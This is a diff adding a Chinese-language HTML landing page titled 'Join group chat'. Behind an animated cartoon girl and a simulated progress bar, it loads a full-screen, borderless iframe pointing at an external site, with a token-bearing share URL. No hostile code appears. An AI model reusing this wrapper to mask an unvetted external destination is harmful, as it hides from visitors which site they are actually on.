@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>加入群聊</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+html, body {
+  width: 100%;
+  height: 100%;
+  overflow: hidden;
+  background: #fff5f8;
+}
+
+/* 加载层 - 全屏布局 */
+#loading {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+  background: #fff5f8;
+  transition: opacity 0.8s ease;
+}
+
+/* 小女孩容器 - 蹦跳动画 */
+.character {
+  position: relative;
+  width: 380px;
+  height: 600px;
+  animation: bounce 0.6s infinite alternate ease-in-out;
+}
+@keyframes bounce {
+  0% { transform: translateY(0); }
+  100% { transform: translateY(-12px); }
+}
+
+/* 帽子 */
+.hat {
+  position: absolute;
+  top: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 280px;
+  height: 220px;
+  background: #ffdce5;
+  border-radius: 140px 140px 100px 100px;
+}
+.hat::before, .hat::after {
+  content: '';
+  position: absolute;
+  top: 20px;
+  width: 60px;
+  height: 80px;
+  background: #ffdce5;
+  border-radius: 30px 30px 20px 20px;
+}
+.hat::before { left: 30px; }
+.hat::after { right: 30px; }
+.bear-nose {
+  position: absolute;
+  top: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 80px;
+  height: 40px;
+  background: #fff;
+  border-radius: 20px;
+}
+.bear-nose::before, .bear-nose::after {
+  content: '';
+  position: absolute;
+  top: 5px;
+  width: 12px;
+  height: 12px;
+  background: #b85050;
+  border-radius: 50%;
+}
+.bear-nose::before { left: 15px; }
+.bear-nose::after { right: 15px; }
+.bear-mouth {
+  position: absolute;
+  top: 15px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 50px;
+  height: 20px;
+  border-bottom: 3px solid #b85050;
+  border-radius: 0 0 25px 25px;
+}
+
+/* 头发 */
+.hair {
+  position: absolute;
+  top: 100px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 360px;
+  height: 450px;
+  background: #ffc8d8;
+  border-radius: 180px;
+  clip-path: polygon(
+    20% 0%, 80% 0%, 100% 30%, 95% 60%, 85% 80%, 70% 90%, 50% 95%,
+    30% 90%, 15% 80%, 5% 60%, 0% 30%
+  );
+}
+
+/* 脸 */
+.face {
+  position: absolute;
+  top: 150px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 220px;
+  height: 260px;
+  background: #ffe0e8;
+  border-radius: 110px;
+}
+/* 眼睛 */
+.eye {
+  position: absolute;
+  top: 60px;
+  width: 70px;
+  height: 90px;
+  background: #fff;
+  border-radius: 35px;
+  overflow: hidden;
+}
+.eye.left { left: 30px; }
+.eye.right { right: 30px; }
+.eye-pupil {
+  position: absolute;
+  bottom: 10px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 40px;
+  height: 60px;
+  background: #703030;
+  border-radius: 20px;
+}
+.eye-highlight {
+  position: absolute;
+  top: 15px;
+  right: 10px;
+  width: 20px;
+  height: 20px;
+  background: #fff;
+  border-radius: 50%;
+}
+.eye-yellow {
+  position: absolute;
+  bottom: 20px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 30px;
+  height: 15px;
+  background: linear-gradient(180deg, #ffd060 0%, #ffb040 100%);
+  border-radius: 15px;
+}
+/* 腮红 */
+.blush {
+  position: absolute;
+  top: 130px;
+  width: 40px;
+  height: 30px;
+  background: #ffb0b0;
+  border-radius: 20px;
+  opacity: 0.6;
+}
+.blush.left { left: 40px; }
+.blush.right { right: 40px; }
+/* 嘴巴 */
+.mouth {
+  position: absolute;
+  top: 170px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 50px;
+  height: 30px;
+  background: #ff8080;
+  border-radius: 0 0 25px 25px;
+}
+
+/* 衣服 */
+.dress {
+  position: absolute;
+  bottom: 0;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 260px;
+  height: 320px;
+  background: #ffdce5;
+  border-radius: 130px 130px 20px 20px;
+}
+.dress-flower {
+  position: absolute;
+  width: 20px;
+  height: 20px;
+  background: #ffb8d0;
+  clip-path: polygon(50% 0%, 100% 35%, 75% 100%, 25% 100%, 0% 35%);
+}
+.dress-flower:nth-child(1) { top: 40px; left: 80px; }
+.dress-flower:nth-child(2) { top: 70px; left: 120px; }
+.dress-flower:nth-child(3) { top: 100px; left: 90px; }
+.dress-flower:nth-child(4) { top: 130px; left: 140px; }
+.dress-flower:nth-child(5) { top: 160px; left: 100px; }
+.dress-flower:nth-child(6) { top: 190px; left: 150px; }
+/* 袖子 */
+.sleeve {
+  position: absolute;
+  top: 200px;
+  width: 120px;
+  height: 200px;
+  background: #ffe8f0;
+  border-radius: 60px;
+}
+.sleeve.left { left: -60px; transform: rotate(-10deg); }
+.sleeve.right { right: -60px; transform: rotate(10deg); }
+/* 手 */
+.hand {
+  position: absolute;
+  top: 220px;
+  width: 40px;
+  height: 40px;
+  background: #ffe0e8;
+  border-radius: 20px;
+}
+.hand.left { left: -80px; animation: fist 0.6s infinite alternate; }
+.hand.right { right: -80px; animation: fist 0.6s infinite alternate reverse; }
+@keyframes fist {
+  0% { transform: scale(1); }
+  100% { transform: scale(1.1); }
+}
+
+/* 腿 */
+.leg {
+  position: absolute;
+  bottom: 0;
+  width: 60px;
+  height: 200px;
+  background: #ffe8f0;
+  border-radius: 30px;
+}
+.leg.left { left: 80px; animation: leg 0.6s infinite alternate; }
+.leg.right { right: 80px; }
+@keyframes leg {
+  0% { transform: translateY(0); }
+  100% { transform: translateY(-20px); }
+}
+.foot {
+  position: absolute;
+  bottom: -10px;
+  width: 50px;
+  height: 30px;
+  background: #ffe8f0;
+  border-radius: 25px 25px 10px 10px;
+}
+.foot.left { left: 80px; }
+.foot.right { right: 80px; bottom: -30px; }
+
+/* 进度条容器 */
+.progress-container {
+  position: absolute;
+  top: 55%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 70%;
+  max-width: 320px;
+  height: 40px;
+  background: #e0e0e0;
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+}
+.progress-bar {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, #52e052 0%, #32c832 100%);
+  border-radius: 20px;
+  transition: width 0.3s ease;
+}
+.progress-text {
+  position: absolute;
+  top: 65%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  font-size: 14px;
+  color: #666;
+  font-weight: 500;
+}
+
+iframe {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  border: none;
+  opacity: 0;
+  transition: opacity 0.8s ease;
+  z-index: 1;
+}
+</style>
+</head>
+<body>
+
+<div id="loading">
+  <div class="character">
+    <!-- 帽子 -->
+    <div class="hat">
+      <div class="bear-nose"><div class="bear-mouth"></div></div>
+    </div>
+    <!-- 头发 -->
+    <div class="hair"></div>
+    <!-- 脸 -->
+    <div class="face">
+      <div class="eye left">
+        <div class="eye-pupil"></div>
+        <div class="eye-highlight"></div>
+        <div class="eye-yellow"></div>
+      </div>
+      <div class="eye right">
+        <div class="eye-pupil"></div>
+        <div class="eye-highlight"></div>
+        <div class="eye-yellow"></div>
+      </div>
+      <div class="blush left"></div>
+      <div class="blush right"></div>
+      <div class="mouth"></div>
+    </div>
+    <!-- 衣服 -->
+    <div class="dress">
+      <div class="dress-flower"></div>
+      <div class="dress-flower"></div>
+      <div class="dress-flower"></div>
+      <div class="dress-flower"></div>
+      <div class="dress-flower"></div>
+      <div class="dress-flower"></div>
+      <div class="sleeve left"></div>
+      <div class="sleeve right"></div>
+      <div class="hand left"></div>
+      <div class="hand right"></div>
+    </div>
+    <!-- 腿 -->
+    <div class="leg left"><div class="foot left"></div></div>
+    <div class="leg right"><div class="foot right"></div></div>
+  </div>
+
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+  <div class="progress-text" id="progressText">加载中 0%</div>
+</div>
+
+<iframe id="myFrame" src=""></iframe>
+
+<script>
+const loading = document.getElementById('loading');
+const iframe = document.getElementById('myFrame');
+const progressBar = document.getElementById('progressBar');
+const progressText = document.getElementById('progressText');
+let done = false;
+let progress = 0;
+
+// 目标地址
+iframe.src = "https://a.6611.fun/group.php/index/share/id/145/t/f6d161e1809b714811a64697602cc240/time/1773506499.html";
+
+// 模拟加载进度
+function simulateProgress() {
+  if (progress >= 100) return;
+  const increment = progress < 50 ? 5 : progress < 80 ? 3 : 1;
+  progress = Math.min(progress + increment, 100);
+  progressBar.style.width = progress + '%';
+  progressText.textContent = `加载中 ${progress}%`;
+  
+  if (progress < 100) {
+    setTimeout(simulateProgress, 100);
+  }
+}
+simulateProgress();
+
+// 显示页面
+function show() {
+  if (done) return;
+  done = true;
+  progress = 100;
+  progressBar.style.width = '100%';
+  progressText.textContent = '加载完成';
+  setTimeout(() => {
+    loading.style.opacity = 0;
+    setTimeout(() => {
+      loading.style.display = 'none';
+      iframe.style.opacity = 1;
+    }, 300);
+  }, 500);
+}
+
+iframe.onload = show;
+iframe.onerror = show;
+setTimeout(show, 1500);
+</script>
+
+</body>
+</html>
